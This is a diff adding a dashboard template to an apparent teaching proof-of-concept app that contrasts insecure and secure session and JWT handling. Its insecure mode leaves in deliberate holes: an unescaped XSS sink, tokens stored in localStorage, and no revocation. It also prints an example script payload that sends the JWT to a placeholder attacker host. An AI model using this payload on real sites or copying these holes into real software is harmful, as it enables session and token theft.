@@ -1,0 +1,210 @@
+{% extends "base.html" %}
+{% block title %}Dashboard — PRP PoC{% endblock %}
+
+{% block content %}
+
+<!-- ── Session info ──────────────────────────────────────────────────── -->
+<div class="card">
+  <h1>Dashboard</h1>
+  <p>Logged in as <strong>{{ user.username }}</strong> (session cookie path).</p>
+
+  {% if profile == 'INSECURE' %}
+  <p style="margin-top:10px;">
+    <span class="vuln-badge">S1</span>
+    Session cookie has <strong>no Secure / HttpOnly / SameSite flags</strong>.
+    Open DevTools → Application → Cookies to confirm.<br>
+    <span class="vuln-badge">S2</span>
+    Session ID was <strong>not regenerated</strong> on login — fixation possible.
+    Check the cookie value before and after login.
+  </p>
+  {% else %}
+  <p style="margin-top:10px;">
+    <span class="secure-badge">SECURE</span>
+    Cookie flags: Secure, HttpOnly, SameSite=Lax.
+    Session ID regenerated on login.
+  </p>
+  {% endif %}
+
+  <p style="margin-top:10px;">
+    <a href="{{ url_for('main.logout') }}" class="btn btn-danger btn-sm">Logout (session)</a>
+  </p>
+</div>
+
+<!-- ── JWT panel ─────────────────────────────────────────────────────── -->
+<div class="card" id="jwt-panel">
+  <h2>
+    JWT bearer-token path
+    {% if profile == 'INSECURE' %}
+      <span class="vuln-badge">S3 — localStorage</span>
+      <span class="vuln-badge">S4 — no revocation</span>
+    {% else %}
+      <span class="secure-badge">in-memory / HttpOnly cookie</span>
+    {% endif %}
+  </h2>
+
+  <button onclick="apiLogin()">API Login (get JWT)</button>
+  <button onclick="callApiMe()" style="margin-left:8px;">Call /api/me</button>
+  <button onclick="apiLogout()" class="btn-danger" style="margin-left:8px;">API Logout</button>
+
+  <div style="margin-top:14px;">
+    <strong>Stored token</strong>
+    {% if profile == 'INSECURE' %}
+      (<span class="vuln-badge">localStorage</span> — readable by any same-origin script):
+    {% else %}
+      (memory variable — not in localStorage):
+    {% endif %}
+    <div id="token-display" style="margin-top:6px; color:#888;">— not yet obtained —</div>
+  </div>
+
+  <div style="margin-top:14px;">
+    <strong>/api/me response:</strong>
+    <pre id="api-me-output">—</pre>
+  </div>
+
+  {% if profile == 'INSECURE' %}
+  <p class="info" style="margin-top:10px;">
+    <strong>S3 proof:</strong> open DevTools console and run
+    <code>localStorage.getItem('jwt')</code> — the token is readable by any script.<br>
+    <strong>S4 proof:</strong> copy the token above, click "API Logout", then use
+    <code>curl -H "Authorization: Bearer &lt;token&gt;" http://localhost:5000/api/me</code>
+    — the server still responds 200.
+  </p>
+  {% endif %}
+</div>
+
+<!-- ── Public notes (XSS sink — S3) ─────────────────────────────────── -->
+<div class="card">
+  <h2>
+    Public notes
+    {% if profile == 'INSECURE' %}
+      <span class="vuln-badge">S3 — XSS sink (|safe)</span>
+    {% else %}
+      <span class="secure-badge">output-escaped</span>
+    {% endif %}
+  </h2>
+
+  {% if profile == 'INSECURE' %}
+  <p class="info" style="margin-bottom:12px;">
+    Notes are rendered without escaping (<code>|safe</code>).
+    Post a note containing a <code>&lt;script&gt;</code> tag to exfiltrate the JWT
+    stored in localStorage.  Example XSS payload (replace attacker host):
+    <br><code>&lt;script&gt;fetch('http://attacker:8888/?t='+localStorage.getItem('jwt'))&lt;/script&gt;</code>
+  </p>
+  {% endif %}
+
+  <!-- Add note form -->
+  <form method="post" action="{{ url_for('main.add_note') }}">
+    <label for="content">New note (visible to all logged-in users)</label>
+    <textarea id="content" name="content" placeholder="Write a note…"></textarea>
+    <button type="submit">Post note</button>
+  </form>
+
+  <hr style="margin:20px 0; border:none; border-top:1px solid #eee;">
+
+  {% if notes %}
+    {% for note in notes %}
+    <div class="note-card">
+      {% if profile == 'INSECURE' %}
+        {# S3 XSS SINK: content rendered without escaping — deliberate vulnerability #}
+        {{ note.content | safe }}
+      {% else %}
+        {# SECURE: Jinja2 auto-escape (default) — injected tags are shown as text #}
+        {{ note.content }}
+      {% endif %}
+      <div class="note-meta">by user #{{ note.user_id }} · {{ note.created_at }}</div>
+    </div>
+    {% endfor %}
+  {% else %}
+    <p class="info">No notes yet.</p>
+  {% endif %}
+</div>
+
+<!-- ── JavaScript ────────────────────────────────────────────────────── -->
+<script>
+  const PROFILE = "{{ profile }}";
+
+  // In-memory token storage for SECURE mode
+  let _memToken = null;
+
+  function storeToken(token) {
+    if (PROFILE === "INSECURE") {
+      // S3: stored in localStorage — any same-origin script can read it
+      localStorage.setItem("jwt", token);
+    } else {
+      // SECURE: stored only in this closure variable, not in any persistent storage
+      _memToken = token;
+    }
+    document.getElementById("token-display").textContent = token;
+  }
+
+  function loadToken() {
+    if (PROFILE === "INSECURE") {
+      return localStorage.getItem("jwt");
+    }
+    return _memToken;
+  }
+
+  function clearToken() {
+    if (PROFILE === "INSECURE") {
+      localStorage.removeItem("jwt");
+    } else {
+      _memToken = null;
+    }
+    document.getElementById("token-display").textContent = "— cleared —";
+  }
+
+  async function apiLogin() {
+    // Re-use the same credentials as the session login for simplicity.
+    // In the PoC the user has already authenticated via the form above.
+    const username = "{{ user.username }}";
+    const password = prompt("Enter your password for the API login:");
+    if (!password) return;
+
+    const resp = await fetch("/api/login", {
+      method: "POST",
+      headers: {"Content-Type": "application/json"},
+      body: JSON.stringify({username, password}),
+    });
+    const data = await resp.json();
+    if (data.token) {
+      storeToken(data.token);
+      document.getElementById("api-me-output").textContent =
+        "Token obtained (storage: " + data.storage + ")";
+    } else {
+      document.getElementById("api-me-output").textContent = JSON.stringify(data);
+    }
+  }
+
+  async function callApiMe() {
+    const token = loadToken();
+    if (!token) {
+      document.getElementById("api-me-output").textContent = "No token — do API Login first.";
+      return;
+    }
+    const resp = await fetch("/api/me", {
+      headers: {"Authorization": "Bearer " + token},
+    });
+    const data = await resp.json();
+    document.getElementById("api-me-output").textContent =
+      JSON.stringify(data, null, 2) + "\n\nHTTP " + resp.status;
+  }
+
+  async function apiLogout() {
+    const token = loadToken();
+    if (token) {
+      await fetch("/api/logout", {
+        method: "POST",
+        headers: {"Authorization": "Bearer " + token},
+      });
+    }
+    // S4 (INSECURE): server did nothing; token still valid.
+    // Copy the token BEFORE clicking logout to prove it still works afterwards.
+    clearToken();
+    document.getElementById("api-me-output").textContent =
+      PROFILE === "INSECURE"
+        ? "Client-side token cleared.\nS4: The token is still valid on the server — paste it into curl to verify."
+        : "Token revoked server-side. Re-using it will return 401.";
+  }
+</script>
+
+{% endblock %}
